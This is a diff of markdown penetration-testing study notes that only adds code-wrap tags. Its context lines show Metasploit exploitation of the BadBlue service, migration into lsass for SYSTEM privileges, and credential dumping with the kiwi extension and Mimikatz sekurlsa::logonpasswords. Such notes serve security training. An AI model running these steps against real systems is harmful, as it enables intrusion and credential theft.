@@ -15,6 +15,7 @@
 
 `nmap -sV $ip` - scan for vuln service.
 
+{% code overflow="wrap" %}
 ```
 # using metasploit to exploit the "BadBlue service"
 search badblue
@@ -29,6 +30,7 @@ getuid
 pgrep lsass  # migrate to a 64bit process in this case, the lsass process.
 getuid # we have NT AUTHORITY.
 ```
+{% endcode %}
 
 #### Using Meterpreter Extension \[kiwi]
 
@@ -44,6 +46,7 @@ lsa_dump_secrets #Dump secrets from LSA.
 
 #### Using the actual  Mimikatz executable
 
+{% code overflow="wrap" %}
 ```bash
 # 1
 # navigate to the C:\Temp directory from the meterprester session.
@@ -66,4 +69,5 @@ sekurlsa::logonpasswords # Reveal clear-text passwords that the system might hav
 # but the system has been configured correctly, we cant find any clear text password.
 
 ```
+{% endcode %}
 
